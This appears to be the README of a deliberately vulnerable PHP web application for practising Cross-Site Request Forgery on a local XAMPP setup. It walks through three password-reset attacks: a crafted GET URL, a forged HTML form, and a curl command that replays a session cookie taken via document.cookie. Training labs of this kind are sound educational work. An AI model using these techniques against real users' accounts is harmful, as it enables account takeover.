# Web-app-to-practice-CSRF
A web based application to perform and learn Cross-Site Request Forgery attack.

Requirements: 
Apache, MySQL Server (like XAMPP)

Getting Started.

Install and configure Xampp.

Database: 
Create a database "user" on http://localhost/phpmyadmin folder.
Create a table "profile" with columns in the order: fname, lname, email, password, gender, cont_num (int), age (int), submission, mem_id (int)
Make email primary key and auto increment mem_id.

Execution:
Download all the files in a folder inside htdocs of XAMPP folder in your C drive.
Execute the main page by typing the following url in your Browser: "http://localhost/folder_name/index.php".
Sign up and Login with varius entries.

Attacks:

1) Exploiting Get parameter in URL.
Change password, through url.
e.g - 'http://localhost/csrf/pppp.php?new_pass=123&re_pass=123&re_password=Reset+Password'
 
2) Exploiting the Source Code of Form.
Copy the source code of page pppp.php in a text editor, save file as filename.html and make the changes in the form tag code as   shown:
<form action="http://localhost/folder_name/pppp.php?new_pass=&re_pass=&re_password=Reset+Password">
<dl>
<dt>
New Password
</dt>
<dd>
<input type="password" name="new_pass" placeholder="New Password..." value= "the_password_you_want_to_set"  required />
</dd>
</dl>
<dl>
<dt> 
Retype New Password
</dt>
		<dd>
		<input type="password" name="re_pass" placeholder="Retype New Password..." value= "the_password_you_want_to_set" required />
		</dd>
		</dl>
		<p align="center">
		<input type="submit" class="btn" value="Reset Password" name="re_password" />
		</p>
	</form>
	
	Run the html file, and password is changed.
  
3) Exploiting using the curl command.
Create a local connection to access the website. 
Inspect element to get Session ID of the user by document.cookie.
Run the following command on linux terminal to change password to "1234".
'curl --cookie "PHPSESSID=userSessionID" --location "serverip/flder_name/pppp.phpnew_pass=1234&re_pass=1234&re_password=Reset+Password" | grep "Password Changed!"'

Future Scope: Styling and Front End of the web application.

The Project is licensed under GNU-GPL
